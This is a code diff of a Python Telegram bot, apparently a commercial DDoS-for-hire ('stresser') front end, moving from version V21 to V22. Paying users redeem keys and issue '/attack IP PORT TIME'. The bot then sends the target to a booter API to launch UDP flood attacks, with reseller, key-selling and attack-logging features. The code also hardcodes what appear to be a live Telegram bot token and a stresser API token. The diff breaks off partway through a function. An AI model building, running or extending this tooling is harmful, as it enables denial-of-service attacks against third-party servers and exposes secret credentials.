@@ -1,19 +1,18 @@
 #!/usr/bin/env python3
 """
-APROLX ELITE V21 - ULTIMATE TELEGRAM ATTACK BOT
-Optimized for Railway / Termux hosting.
-API: stresser.works
+APROLX ELITE V22 - TELEGRAM BOT
+Fixed: get_setting() default argument
 """
 
 import telebot
-from telebot.types import ReplyKeyboardMarkup, InlineKeyboardMarkup, InlineKeyboardButton
+from telebot.types import ReplyKeyboardMarkup
 import threading
 import os
-import random
-import string
 import re
 import sys
 import json
+import random
+import string
 from datetime import datetime, timedelta
 import time
 import requests
@@ -23,45 +22,33 @@ sys.stderr.reconfigure(line_buffering=True)
 
 BOT_START_TIME = datetime.now()
 
-# ============= CONFIGURATION =============
-BOT_TOKEN = "8771905727:AAHgWlvO3Jx6po3OVD5f4QHt-_C3tJDm0JY"
+# ============= CONFIG =============
+BOT_TOKEN = os.environ.get('BOT_TOKEN', "8771905727:AAHgWlvO3Jx6po3OVD5f4QHt-_C3tJDm0JY")
 BOT_OWNER = 1987818347
 
-# Stresser.works API config
 DEFAULT_API_URL = "https://stresser.works/api/start"
 DEFAULT_API_TOKEN = "c9b483cfafaa99e8f8800d197df24ccc73b9498398b5301c890cc12cb5e39563"
 DEFAULT_API_METHOD = "UDP-BIG"
 DEFAULT_API_GEOLOCATION = "ALL"
 
-# ============= FILE STORAGE =============
-DATA_FILE = "bot_data_v21.json"
+DATA_FILE = "bot_data_v22.json"
 
+# ============= DATA =============
 def load_data():
-    default_data = {
-        "users": {},
-        "keys": {},
-        "resellers": {},
+    default = {
+        "users": {}, "keys": {}, "resellers": {},
         "admins": {str(BOT_OWNER): {"added_at": datetime.now().isoformat()}},
-        "approved_groups": {},
-        "attack_logs": [],
-        "admin_logs": [],
-        "banned_users": {},
-        "feedbacks": [],
+        "approved_groups": {}, "attack_logs": [], "admin_logs": [],
+        "banned_users": {}, "feedbacks": [],
         "settings": {
             "max_attack_time": 300,
             "user_cooldown": 30,
-            "concurrent_limit": 4,
             "maintenance_mode": False,
-            "maintenance_msg": "🔧 𝐀𝐏𝐑𝐎𝐋𝐗 𝐄𝐋𝐈𝐓𝐄 is under maintenance. Please try again later.",
-            "port_protection": True,
-            "feedback_system": True,
-            "feedback_channel": "-1008605900206",
+            "maintenance_msg": "Bot under maintenance.",
             "api_url": DEFAULT_API_URL,
             "api_token": DEFAULT_API_TOKEN,
             "api_method": DEFAULT_API_METHOD,
             "api_geolocation": DEFAULT_API_GEOLOCATION,
-            "blocked_ports": [],
-            "blocked_ips": []
         }
     }
     if os.path.exists(DATA_FILE):
@@ -69,506 +56,478 @@ def load_data():
             with open(DATA_FILE, "r") as f:
                 d = json.load(f)
                 if isinstance(d, dict):
-                    for key, val in default_data.items():
-                        d.setdefault(key, val)
-                    # ensure new keys exist inside settings
-                    for sk, sv in default_data["settings"].items():
+                    for k, v in default.items():
+                        d.setdefault(k, v)
+                    for sk, sv in default["settings"].items():
                         d["settings"].setdefault(sk, sv)
                     return d
-        except Exception as e:
-            print(f"Error loading {DATA_FILE}: {e}. Resetting to defaults.")
-    return default_data
+        except:
+            pass
+    return default
 
-def save_data(data):
-    with open(DATA_FILE, 'w') as f:
-        json.dump(data, f, indent=2, default=str)
+def save_data(d):
+    try:
+        with open(DATA_FILE, 'w') as f:
+            json.dump(d, f, indent=2, default=str)
+    except:
+        pass
 
 data = load_data()
-bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
+bot = telebot.TeleBot(BOT_TOKEN, parse_mode=None)
 
-# ============= HELPER FUNCTIONS =============
-def is_owner(user_id):
-    return user_id == BOT_OWNER or str(user_id) in data["admins"]
-
-def is_master_owner(user_id):
-    return user_id == BOT_OWNER
-
-def is_reseller(user_id):
-    reseller = data["resellers"].get(str(user_id))
-    return reseller is not None and not reseller.get('blocked', False)
-
-def is_banned(user_id):
-    return str(user_id) in data["banned_users"]
-
-def get_setting(key, default):
-    return data["settings"].get(key, default)
-
-def set_setting(key, value):
-    data["settings"][key] = value
+# ============= HELPERS =============
+def is_owner(uid): return uid == BOT_OWNER or str(uid) in data["admins"]
+def is_reseller(uid):
+    r = data["resellers"].get(str(uid))
+    return r is not None and not r.get('blocked', False)
+def is_banned(uid): return str(uid) in data["banned_users"]
+def get_setting(k, d=None): return data["settings"].get(k, d)
+def set_setting(k, v):
+    data["settings"][k] = v
     save_data(data)
 
-def get_max_attack_time():
-    return get_setting('max_attack_time', 300)
+def gen_key(length=16):
+    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))
 
-def get_user_cooldown_setting():
-    return get_setting('user_cooldown', 30)
+def fmt_key(k):
+    return '-'.join([k[i:i+4] for i in range(0, len(k), 4)])
 
-def is_maintenance():
-    return get_setting('maintenance_mode', False)
+def has_valid_key(uid):
+    if is_owner(uid) or is_reseller(uid): return True
+    u = data["users"].get(str(uid))
+    if not u or not u.get('key_expiry'): return False
+    try: return datetime.now() <= datetime.fromisoformat(u['key_expiry'])
+    except: return False
 
-def get_maintenance_msg():
-    return get_setting('maintenance_msg', '🔧 Bot maintenance mein hai.')
+def time_remaining(uid):
+    if is_owner(uid): return "Unlimited (Owner)"
+    if is_reseller(uid): return "Unlimited (Reseller)"
+    u = data["users"].get(str(uid))
+    if not u or not u.get('key_expiry'): return "No Key"
+    try:
+        rem = datetime.fromisoformat(u['key_expiry']) - datetime.now()
+        if rem.total_seconds() <= 0: return "Expired"
+        d = rem.days; h, r = divmod(rem.seconds, 3600); m, _ = divmod(r, 60)
+        return f"{d}d {h}h {m}m"
+    except: return "Error"
 
-def log_admin_action(admin_id, action_desc):
-    data["admin_logs"].append({
-        'admin_id': admin_id,
-        'action': action_desc,
-        'timestamp': datetime.now().isoformat()
-    })
-    save_data(data)
-
-# ============= COOLDOWN & ATTACK TRACKING =============
 user_cooldown = {}
 attack_lock = threading.Lock()
 active_attacks = {}
-user_state = {}
 
-def get_user_cooldown_remaining(user_id):
-    if user_id in user_cooldown:
-        remaining = user_cooldown[user_id] - time.time()
-        if remaining > 0:
-            return int(remaining)
-        else:
-            del user_cooldown[user_id]
+def get_cd_remaining(uid):
+    if uid in user_cooldown:
+        r = user_cooldown[uid] - time.time()
+        if r > 0: return int(r)
+        del user_cooldown[uid]
     return 0
 
-def set_user_cooldown(user_id):
-    cooldown_sec = get_user_cooldown_setting()
-    if cooldown_sec > 0:
-        user_cooldown[user_id] = time.time() + cooldown_sec
-
-def has_valid_key(user_id):
-    if is_owner(user_id) or is_reseller(user_id):
-        return True
-    user = data["users"].get(str(user_id))
-    if not user or not user.get('key_expiry'):
-        return False
-    try:
-        expiry = datetime.fromisoformat(user['key_expiry'])
-        if datetime.now() > expiry:
-            return False
-        return True
-    except:
-        return False
-
-def get_time_remaining_full(user_id):
-    if is_owner(user_id):
-        return "Unlimited (Owner)"
-    user = data["users"].get(str(user_id))
-    if not user or not user.get('key_expiry'):
-        return "Expired"
-    try:
-        remaining = datetime.fromisoformat(user['key_expiry']) - datetime.now()
-        if remaining.total_seconds() <= 0:
-            return "Expired"
-        days = remaining.days
-        hours, r2 = divmod(remaining.seconds, 3600)
-        minutes, _ = divmod(r2, 60)
-        return f"{days}d {hours}h {minutes}m"
-    except:
-        return "Error"
+def set_cd(uid):
+    cd = get_setting('user_cooldown', 30)
+    if cd > 0: user_cooldown[uid] = time.time() + cd
 
 def is_attack_running():
     with attack_lock:
         now = datetime.now()
-        for attack_id, attack in list(active_attacks.items()):
-            if attack['end_time'] <= now:
-                del active_attacks[attack_id]
+        for aid, atk in list(active_attacks.items()):
+            if atk['end_time'] <= now: del active_attacks[aid]
         return len(active_attacks) > 0
 
-def get_active_attack_info():
-    with attack_lock:
-        now = datetime.now()
-        for attack_id, attack in active_attacks.items():
-            if attack['end_time'] > now:
-                remaining = int((attack['end_time'] - now).total_seconds())
-                return {
-                    'running': True,
-                    'username': attack.get('username', 'Unknown'),
-                    'target': attack.get('target'),
-                    'port': attack.get('port'),
-                    'remaining': remaining,
-                }
-        return {'running': False}
-
-def log_attack(user_id, username, target, port, duration):
-    data["attack_logs"].append({
-        'user_id': user_id,
-        'username': username,
-        'target': target,
-        'port': port,
-        'duration': duration,
-        'timestamp': datetime.now().isoformat()
-    })
-    if str(user_id) in data["users"]:
-        data["users"][str(user_id)]["total_attacks"] = data["users"][str(user_id)].get("total_attacks", 0) + 1
-    save_data(data)
-
-def get_ist_time():
+def ist_now():
     return (datetime.now() + timedelta(hours=5, minutes=30)).strftime('%H:%M:%S')
 
-# ============= API DISPATCHER =============
-def send_attack_to_api(ip, port, dur):
-    """Send attack request to stresser.works API. Returns (success, msg)."""
+# ============= API =============
+def api_attack(ip, port, dur):
     try:
-        api_url = get_setting("api_url", DEFAULT_API_URL)
-        api_token = get_setting("api_token", DEFAULT_API_TOKEN)
-        api_method = get_setting("api_method", DEFAULT_API_METHOD)
-        api_geo = get_setting("api_geolocation", DEFAULT_API_GEOLOCATION)
-
-        req_url = (
-            f"{api_url}?token={api_token}"
-            f"&host={ip}"
-            f"&port={port}"
-            f"&time={dur}"
-            f"&method={api_method}"
-            f"&geolocation={api_geo}"
-        )
-
-        print(f"[API] Sending: {req_url}")
-        resp = requests.get(req_url, timeout=15)
-        print(f"[API] HTTP {resp.status_code} | Body: {resp.text[:300]}")
-
-        if resp.status_code == 200:
-            return True, resp.text
-        else:
-            return False, f"HTTP {resp.status_code}: {resp.text[:200]}"
+        url = get_setting("api_url", DEFAULT_API_URL)
+        token = get_setting("api_token", DEFAULT_API_TOKEN)
+        method = get_setting("api_method", DEFAULT_API_METHOD)
+        geo = get_setting("api_geolocation", DEFAULT_API_GEOLOCATION)
+        req = f"{url}?token={token}&host={ip}&port={port}&time={dur}&method={method}&geolocation={geo}"
+        resp = requests.get(req, timeout=10)
+        if resp.status_code == 200: return True, resp.text
+        return False, f"HTTP {resp.status_code}: {resp.text[:200]}"
     except Exception as e:
-        print(f"[API] Error: {e}")
         return False, str(e)
 
 # ============= KEYBOARDS =============
-def get_main_keyboard(user_id):
-    markup = ReplyKeyboardMarkup(resize_keyboard=True)
-    if is_owner(user_id):
-        markup.row("🔥 ATTACK", "📊 STATUS")
-        markup.row("👤 PROFILE", "👑 OWNER PANEL")
-        return markup
-    if is_reseller(user_id):
-        markup.row("🔥 ATTACK", "📊 STATUS")
-        markup.row("🔑 REDEEM KEY", "👤 PROFILE")
-        markup.row("💼 RESELLER PANEL")
-        return markup
-    if has_valid_key(user_id):
-        markup.row("🔥 ATTACK", "📊 STATUS")
-        markup.row("🔑 REDEEM KEY", "👤 PROFILE")
-        return markup
-    markup.row("🔑 REDEEM KEY", "👤 PROFILE")
-    return markup
+def kb_main(uid):
+    m = ReplyKeyboardMarkup(resize_keyboard=True)
+    if is_owner(uid):
+        m.row("🔥 ATTACK", "📊 STATUS")
+        m.row("👤 PROFILE", "👑 OWNER PANEL")
+    elif is_reseller(uid) or has_valid_key(uid):
+        m.row("🔥 ATTACK", "📊 STATUS")
+        m.row("🔑 REDEEM", "👤 PROFILE")
+    else:
+        m.row("🔑 REDEEM", "👤 PROFILE")
+    return m
 
-def get_owner_keyboard():
-    markup = ReplyKeyboardMarkup(resize_keyboard=True)
-    markup.row("🔑 GEN KEY", "🗑️ DELETE KEY")
-    markup.row("👥 USERS LIST", "➕ ADD RESELLER")
-    markup.row("📊 SERVER STATS", "📢 BROADCAST")
-    markup.row("⚙️ SETTINGS", "❌ CLOSE PANEL")
-    return markup
+def kb_owner():
+    m = ReplyKeyboardMarkup(resize_keyboard=True)
+    m.row("🔑 GEN KEY", "👥 USERS")
+    m.row("📊 STATS", "📢 BROADCAST")
+    m.row("⚙️ SETTINGS", "❌ CLOSE")
+    return m
 
-def get_back_keyboard():
-    markup = ReplyKeyboardMarkup(resize_keyboard=True)
-    markup.row("🏠 MAIN MENU")
-    return markup
-
-# ============= BOT COMMANDS =============
-
+# ============= COMMANDS =============
 @bot.message_handler(commands=['start', 'help'])
-def cmd_start(message):
-    user_id = message.from_user.id
-    if is_banned(user_id):
-        bot.reply_to(message, "🚫 You are banned from using this bot.")
-        return
-    username = message.from_user.username or message.from_user.first_name
-    
-    text = f"""🔥 𝐀𝐏𝐑𝐎𝐋𝐗 𝐄𝐋𝐈𝐓𝐄 𝐕𝟐𝟏 🔥
-─────────────────────
-Welcome, @{username}! 👤
-Your gateway to high-performance attack execution.
-
-• 🎯 Method: {get_setting('api_method', 'UDP-BIG')}
-• ⚡ Status: ONLINE
-• ⏰ Time Remaining: {get_time_remaining_full(user_id)}
-─────────────────────
-Use the buttons below or send commands to interact."""
-    bot.send_message(message.chat.id, text, reply_markup=get_main_keyboard(user_id))
+def cmd_start(msg):
+    uid = msg.from_user.id
+    if is_banned(uid):
+        bot.reply_to(msg, "🚫 Banned."); return
+    name = msg.from_user.username or msg.from_user.first_name
+    txt = (
+        f"🔥 <b>APROLX ELITE V22</b> 🔥\n"
+        f"━━━━━━━━━━━━━━━━━━━━━\n"
+        f"👋 Welcome, <b>{name}</b>!\n\n"
+        f"🎯 Method: <code>{get_setting('api_method', 'UDP-BIG')}</code>\n"
+        f"⚡ Status: <b>ONLINE</b>\n"
+        f"⏰ Time: <b>{time_remaining(uid)}</b>\n"
+        f"━━━━━━━━━━━━━━━━━━━━━\n"
+        f"📌 /attack IP PORT TIME"
+    )
+    bot.send_message(msg.chat.id, txt, reply_markup=kb_main(uid), parse_mode="HTML")
 
 @bot.message_handler(commands=['attack'])
-def cmd_attack_command(message):
-    user_id = message.from_user.id
-    if is_banned(user_id): return
-    chat_id = message.chat.id
-    
-    # Check group approval if in group
-    if message.chat.type in ['group', 'supergroup']:
-        group_id = str(message.chat.id)
-        if group_id not in data["approved_groups"]:
-            bot.reply_to(message, "⚠️ This group is not approved for attacks! Contact owner to use /approve.")
-            return
-    
-    if not is_owner(user_id) and not has_valid_key(user_id):
-        bot.reply_to(message, "⚠️ You don't have an active key or subscription! Please redeem a key.")
-        return
-        
-    parts = message.text.split()[1:]
+def cmd_attack(msg):
+    uid = msg.from_user.id
+    if is_banned(uid): return
+    cid = msg.chat.id
+
+    if get_setting('maintenance_mode', False) and not is_owner(uid):
+        bot.reply_to(msg, f"🔧 {get_setting('maintenance_msg', 'Maintenance')}"); return
+
+    if msg.chat.type in ['group', 'supergroup']:
+        if str(cid) not in data["approved_groups"]:
+            bot.reply_to(msg, "⚠️ Group not approved!"); return
+
+    if not is_owner(uid) and not has_valid_key(uid):
+        bot.reply_to(msg, "⚠️ No active key! /redeem first."); return
+
+    parts = msg.text.split()[1:]
     if len(parts) != 3:
-        bot.reply_to(message, "❌ Usage: /attack <ip> <port> <time>\nExample: /attack 52.140.18.56 11398 60")
-        return
-        
-    ip, port_str, dur_str = parts[0], parts[1], parts[2]
-    
-    # Validation
+        bot.reply_to(msg, "❌ <b>Usage:</b> <code>/attack IP PORT TIME</code>", parse_mode="HTML"); return
+
+    ip, ps, ds = parts
     if not re.match(r'^(\d{1,3}\.){3}\d{1,3}$', ip):
-        bot.reply_to(message, "❌ Invalid IP address format!")
-        return
-        
+        bot.reply_to(msg, "❌ Invalid IP!"); return
+
     try:
-        port = int(port_str)
-        dur = int(dur_str)
-        if port < 1 or port > 65535:
-            bot.reply_to(message, "❌ Invalid port (1-65535)!")
-            return
-        if dur < 1:
-            bot.reply_to(message, "❌ Duration must be at least 1 second!")
-            return
-        if dur > get_max_attack_time() and not is_owner(user_id):
-            bot.reply_to(message, f"❌ Max attack time is {get_max_attack_time()}s!")
-            return
+        port = int(ps); dur = int(ds)
+        if not (1 <= port <= 65535): bot.reply_to(msg, "❌ Port 1-65535!"); return
+        if dur < 1: bot.reply_to(msg, "❌ Min 1s!"); return
+        if dur > get_setting('max_attack_time', 300) and not is_owner(uid):
+            bot.reply_to(msg, f"❌ Max {get_setting('max_attack_time', 300)}s!"); return
     except:
-        bot.reply_to(message, "❌ Invalid port or duration number!")
-        return
+        bot.reply_to(msg, "❌ Invalid port/time!"); return
 
-    # Check feedback lock
-    user_rec = data["users"].get(str(user_id), {})
-    if user_rec.get("pending_feedback") and not is_owner(user_id) and get_setting("feedback_system", True):
-        bot.reply_to(message, "⚠️ 𝐅𝐄𝐄𝐃𝐁𝐀𝐂𝐊 𝐑𝐄𝐐𝐔𝐈𝐑𝐄𝐃!\n\nPlease send a screenshot/photo of your previous attack result to unlock your next attack.")
-        return
-
-    # Cooldown check
-    cd = get_user_cooldown_remaining(user_id)
-    if cd > 0 and not is_owner(user_id):
-        bot.reply_to(message, f"⏸️ Cooldown active! Please wait {cd} seconds.")
-        return
+    cd = get_cd_remaining(uid)
+    if cd > 0 and not is_owner(uid):
+        bot.reply_to(msg, f"⏸️ Cooldown: {cd}s"); return
 
     if is_attack_running():
-        info = get_active_attack_info()
-        bot.reply_to(message, f"❌ An attack is already in progress!\nTarget: {info['target']}:{info['port']} ({info['remaining']}s left)")
-        return
+        bot.reply_to(msg, "❌ Attack already running!"); return
 
-    set_user_cooldown(user_id)
-    start_ist = get_ist_time()
-    display_name = message.from_user.username or f"User_{user_id}"
-    method = get_setting("api_method", "UDP-BIG")
+    set_cd(uid)
+    name = msg.from_user.username or f"User_{uid}"
 
-    # ===== Send to API first =====
-    ok, api_msg = send_attack_to_api(ip, port, dur)
-
+    ok, r = api_attack(ip, port, dur)
     if not ok:
-        bot.reply_to(
-            message,
-            f"❌ 𝐀𝐓𝐓𝐀𝐂𝐊 𝐅𝐀𝐈𝐋𝐄𝐃\n\n"
-            f"API Response: <code>{api_msg[:300]}</code>\n\n"
-            f"Possible reasons:\n• Token expired/invalid\n• Balance khatam\n• Target already under attack\n• Method galat"
-        )
-        return
+        bot.reply_to(msg, f"❌ <b>FAILED</b>\n<code>{r[:300]}</code>", parse_mode="HTML"); return
 
     bot.reply_to(
-        message,
-        f"💀 𝐀𝐏𝐑𝐎𝐋𝐗 𝐀𝐓𝐓𝐀𝐂𝐊 𝐋𝐀𝐔𝐍𝐂𝐇𝐄𝐃 💀\n\n"
-        f"👤 User: @{display_name}\n"
-        f"🎯 Target: {ip}:{port}\n"
-        f"⏱️ Duration: {dur}s\n"
-        f"🚀 Method: {method}\n"
-        f"📅 Started: {start_ist} IST"
+        msg,
+        f"💀 <b>ATTACK LAUNCHED</b> 💀\n"
+        f"━━━━━━━━━━━━━━━━━━━━━\n"
+        f"👤 User: <b>@{name}</b>\n"
+        f"🎯 Target: <code>{ip}:{port}</code>\n"
+        f"⏱️ Duration: <b>{dur}s</b>\n"
+        f"🚀 Method: <b>{get_setting('api_method', 'UDP-BIG')}</b>\n"
+        f"📅 Started: <b>{ist_now()} IST</b>",
+        parse_mode="HTML"
     )
 
-    log_attack(user_id, display_name, ip, port, dur)
-    if not is_owner(user_id) and get_setting("feedback_system", True):
-        data["users"].setdefault(str(user_id), {})["pending_feedback"] = True
-        save_data(data)
+    data["attack_logs"].append({
+        'user_id': uid, 'username': name, 'target': ip, 'port': port,
+        'duration': dur, 'timestamp': datetime.now().isoformat()
+    })
+    save_data(data)
 
-    attack_id = f"{user_id}_{datetime.now().timestamp()}"
+    aid = f"{uid}_{time.time()}"
     with attack_lock:
-        active_attacks[attack_id] = {
-            'target': ip, 'port': port, 'duration': dur,
-            'user_id': user_id, 'username': display_name,
+        active_attacks[aid] = {
+            'target': ip, 'port': port,
             'end_time': datetime.now() + timedelta(seconds=dur)
         }
 
-    def finish_attack():
+    def done():
         time.sleep(dur)
-        with attack_lock:
-            if attack_id in active_attacks:
-                del active_attacks[attack_id]
+        with attack_lock: active_attacks.pop(aid, None)
         try:
-            bot.send_message(chat_id, f"✅ 𝐀𝐏𝐑𝐎𝐋𝐗 𝐀𝐓𝐓𝐀𝐂𝐊 𝐂𝐎𝐌𝐏𝐋𝐄𝐓𝐄𝐃 ✅\n\n🎯 Target: {ip}:{port}\n⏱️ Duration: {dur}s\n\n📸 Please send a screenshot/photo of the attack result as feedback to unlock your next attack!")
-        except:
-            pass
+            bot.send_message(cid, f"✅ <b>ATTACK COMPLETE</b>\n🎯 {ip}:{port} | {dur}s", parse_mode="HTML")
+        except: pass
 
-    threading.Thread(target=finish_attack, daemon=True).start()
+    threading.Thread(target=done, daemon=True).start()
 
-# ============= OWNER / ADMIN COMMANDS =============
+@bot.message_handler(commands=['genkey', 'gen'])
+def cmd_gen(msg):
+    if not is_owner(msg.from_user.id): return
+    p = msg.text.split()
+    if len(p) < 2:
+        bot.reply_to(msg, "⚠️ <code>/genkey DAYS [AMOUNT]</code>", parse_mode="HTML"); return
+    try:
+        days = int(p[1]); amt = int(p[2]) if len(p) > 2 else 1
+    except:
+        bot.reply_to(msg, "❌ Invalid!"); return
 
-@bot.message_handler(commands=['approve'])
-def cmd_approve_group(message):
-    if not is_owner(message.from_user.id): return
-    parts = message.text.split()
-    if len(parts) < 5:
-        bot.reply_to(message, "⚠️ Usage: /approve <group_id> <conc> <time> <cd>")
-        return
-    gid, conc, dur, cd = parts[1], parts[2], parts[3], parts[4]
-    data["approved_groups"][gid] = {"concurrent": conc, "time": dur, "cooldown": cd, "approved_at": datetime.now().isoformat()}
+    keys = []
+    for _ in range(amt):
+        raw = gen_key(16); formatted = fmt_key(raw)
+        data["keys"][formatted] = {
+            "days": days, "created_at": datetime.now().isoformat(),
+            "used": False, "used_by": None
+        }
+        keys.append(formatted)
     save_data(data)
-    bot.reply_to(message, f"✅ Group {gid} approved successfully!")
 
-@bot.message_handler(commands=['disapprove'])
-def cmd_disapprove_group(message):
-    if not is_owner(message.from_user.id): return
-    parts = message.text.split()
-    if len(parts) < 2:
-        bot.reply_to(message, "⚠️ Usage: /disapprove <group_id>")
-        return
-    gid = parts[1]
-    if gid in data["approved_groups"]:
-        del data["approved_groups"][gid]
-        save_data(data)
-        bot.reply_to(message, f"✅ Group {gid} removed from approved list.")
-    else:
-        bot.reply_to(message, f"❌ Group {gid} not found in approved list.")
+    txt = f"✅ <b>Generated {amt} Key(s)</b>\n━━━━━━━━━━━━━\n"
+    for k in keys: txt += f"<code>{k}</code>\n"
+    txt += f"━━━━━━━━━━━━━\n⏰ Duration: <b>{days} days</b>"
+    bot.reply_to(msg, txt, parse_mode="HTML")
 
-@bot.message_handler(commands=['approved_groups'])
-def cmd_list_approved_groups(message):
-    if not is_owner(message.from_user.id): return
-    if not data["approved_groups"]:
-        bot.reply_to(message, "📂 No approved groups found.")
-        return
-    text = "📋 𝐀𝐏𝐑𝐎𝐋𝐗 𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃 𝐆𝐑𝐎𝐔𝐏𝐒:\n─────────────────────\n"
-    for gid, info in data["approved_groups"].items():
-        text += f"• ID: <code>{gid}</code> | Conc: {info['concurrent']} | Time: {info['time']}s\n"
-    bot.reply_to(message, text, parse_mode="HTML")
+@bot.message_handler(commands=['redeem'])
+def cmd_redeem(msg):
+    uid = msg.from_user.id
+    if is_banned(uid): return
+    p = msg.text.split()
+    if len(p) < 2:
+        bot.reply_to(msg, "⚠️ <code>/redeem KEY</code>", parse_mode="HTML"); return
+    key = p[1].strip().upper()
+    if key not in data["keys"]:
+        bot.reply_to(msg, "❌ Invalid key!"); return
+    kinfo = data["keys"][key]
+    if kinfo.get("used"):
+        bot.reply_to(msg, "❌ Already used!"); return
 
-@bot.message_handler(commands=['setapi'])
-def cmd_set_api(message):
-    if not is_owner(message.from_user.id): return
-    parts = message.text.split()
-    if len(parts) < 3:
-        bot.reply_to(
-            message,
-            "⚠️ Usage: /setapi <url> <token> [method] [geolocation]\n"
-            "Example: /setapi https://stresser.works/api/start YOUR_TOKEN UDP-BIG ALL"
-        )
-        return
-    url = parts[1]
-    token = parts[2]
-    method = parts[3] if len(parts) > 3 else "UDP-BIG"
-    geo = parts[4] if len(parts) > 4 else "ALL"
-    set_setting("api_url", url)
-    set_setting("api_token", token)
-    set_setting("api_method", method)
-    set_setting("api_geolocation", geo)
-    bot.reply_to(
-        message,
-        f"✅ API Updated Successfully!\n\n"
-        f"📡 URL: {url}\n"
-        f"🔑 Token: {token}\n"
-        f"⚙️ Method: {method}\n"
-        f"🌍 Geo: {geo}"
+    days = kinfo["days"]
+    expiry = datetime.now() + timedelta(days=days)
+    data["users"].setdefault(str(uid), {})
+    existing = data["users"][str(uid)].get("key_expiry")
+    if existing:
+        try:
+            old_exp = datetime.fromisoformat(existing)
+            if old_exp > datetime.now():
+                expiry = old_exp + timedelta(days=days)
+        except: pass
+    data["users"][str(uid)]["key_expiry"] = expiry.isoformat()
+    data["users"][str(uid)]["username"] = msg.from_user.username or msg.from_user.first_name
+    kinfo["used"] = True; kinfo["used_by"] = uid
+    kinfo["used_at"] = datetime.now().isoformat()
+    save_data(data)
+    bot.reply_to(msg, f"✅ <b>KEY REDEEMED!</b>\n⏰ +{days} days\n📅 Expires: <b>{expiry.strftime('%d %b %Y')}</b>", parse_mode="HTML")
+
+@bot.message_handler(commands=['profile'])
+def cmd_profile(msg):
+    uid = msg.from_user.id
+    u = data["users"].get(str(uid), {})
+    txt = (
+        f"👤 <b>PROFILE</b>\n"
+        f"━━━━━━━━━━━━━━━━━━━━━\n"
+        f"🆔 ID: <code>{uid}</code>\n"
+        f"📛 Name: <b>{msg.from_user.first_name}</b>\n"
+        f"⏰ Time: <b>{time_remaining(uid)}</b>\n"
+        f"🎯 Attacks: <b>{u.get('total_attacks', 0)}</b>\n"
+        f"━━━━━━━━━━━━━━━━━━━━━"
     )
+    bot.reply_to(msg, txt, parse_mode="HTML")
 
-@bot.message_handler(commands=['setfeedbackchannel'])
-def cmd_set_feedback_channel(message):
-    if not is_owner(message.from_user.id): return
-    parts = message.text.split()
-    if len(parts) < 2:
-        bot.reply_to(message, "⚠️ Usage: /setfeedbackchannel <channel_id>")
-        return
-    ch = parts[1]
-    set_setting("feedback_channel", ch)
-    bot.reply_to(message, f"✅ Feedback channel set to: {ch}")
-
-@bot.message_handler(commands=['testapi'])
-def cmd_test_api(message):
-    if not is_owner(message.from_user.id): return
-    ok, msg = send_attack_to_api("1.1.1.1", 80, 5)
-    if ok:
-        bot.reply_to(message, f"✅ API WORKING\n\nResponse: <code>{msg[:300]}</code>")
+@bot.message_handler(commands=['status'])
+def cmd_status(msg):
+    with attack_lock:
+        now = datetime.now()
+        running = [(a, atk) for a, atk in active_attacks.items() if atk['end_time'] > now]
+    txt = (
+        f"📊 <b>STATUS</b>\n"
+        f"━━━━━━━━━━━━━━━━━━━━━\n"
+        f"🤖 Bot: <b>ONLINE</b>\n"
+        f"⏱️ Uptime: <b>{str(datetime.now() - BOT_START_TIME).split('.')[0]}</b>\n"
+        f"👥 Users: <b>{len(data['users'])}</b>\n"
+        f"💀 Attacks: <b>{len(data['attack_logs'])}</b>\n"
+    )
+    if running:
+        for a, atk in running:
+            rem = int((atk['end_time'] - now).total_seconds())
+            txt += f"⚔️ {atk['target']}:{atk['port']} ({rem}s)\n"
     else:
-        bot.reply_to(message, f"❌ API FAILED\n\nResponse: <code>{msg[:300]}</code>")
+        txt += "💤 No active attacks"
+    bot.reply_to(msg, txt, parse_mode="HTML")
+
+@bot.message_handler(commands=['panel'])
+def cmd_panel(msg):
+    if not is_owner(msg.from_user.id): return
+    bot.reply_to(msg, "👑 <b>OWNER PANEL</b>", reply_markup=kb_owner(), parse_mode="HTML")
+
+@bot.message_handler(commands=['users'])
+def cmd_users(msg):
+    if not is_owner(msg.from_user.id): return
+    if not data["users"]:
+        bot.reply_to(msg, "📂 No users."); return
+    txt = "👥 <b>USERS</b>\n━━━━━━━━━━━━━\n"
+    for i, (uid, u) in enumerate(list(data["users"].items())[:50], 1):
+        txt += f"{i}. <code>{uid}</code> | {u.get('total_attacks', 0)} attacks\n"
+    bot.reply_to(msg, txt, parse_mode="HTML")
+
+@bot.message_handler(commands=['broadcast'])
+def cmd_broadcast(msg):
+    if not is_owner(msg.from_user.id): return
+    p = msg.text.split(maxsplit=1)
+    if len(p) < 2:
+        bot.reply_to(msg, "⚠️ /broadcast MSG"); return
+    text = p[1]; sent = 0
+    for uid in data["users"]:
+        try:
+            bot.send_message(int(uid), f"📢 <b>BROADCAST</b>\n\n{text}", parse_mode="HTML")
+            sent += 1
+        except: pass
+    bot.reply_to(msg, f"✅ Sent to {sent} users.")
+
+@bot.message_handler(commands=['stats'])
+def cmd_stats(msg):
+    if not is_owner(msg.from_user.id): return
+    txt = (
+        f"📊 <b>STATS</b>\n"
+        f"👥 Users: <b>{len(data['users'])}</b>\n"
+        f"🔑 Keys: <b>{len(data['keys'])}</b>\n"
+        f"💀 Attacks: <b>{len(data['attack_logs'])}</b>\n"
+        f"⏱️ Uptime: <b>{str(datetime.now() - BOT_START_TIME).split('.')[0]}</b>"
+    )
+    bot.reply_to(msg, txt, parse_mode="HTML")
 
 @bot.message_handler(commands=['ban'])
-def cmd_ban(message):
-    if not is_owner(message.from_user.id): return
-    parts = message.text.split()
-    if len(parts) < 2:
-        bot.reply_to(message, "⚠️ Usage: /ban <user_id>")
-        return
-    uid = parts[1]
-    data["banned_users"][uid] = datetime.now().isoformat()
-    save_data(data)
-    bot.reply_to(message, f"✅ User {uid} banned.")
+def cmd_ban(msg):
+    if not is_owner(msg.from_user.id): return
+    p = msg.text.split()
+    if len(p) < 2: bot.reply_to(msg, "⚠️ /ban ID"); return
+    data["banned_users"][p[1]] = datetime.now().isoformat()
+    save_data(data); bot.reply_to(msg, f"✅ Banned {p[1]}")
 
 @bot.message_handler(commands=['unban'])
-def cmd_unban(message):
-    if not is_owner(message.from_user.id): return
-    parts = message.text.split()
-    if len(parts) < 2:
-        bot.reply_to(message, "⚠️ Usage: /unban <user_id>")
-        return
-    uid = parts[1]
-    if uid in data["banned_users"]:
-        del data["banned_users"][uid]
-        save_data(data)
-        bot.reply_to(message, f"✅ User {uid} unbanned.")
-    else:
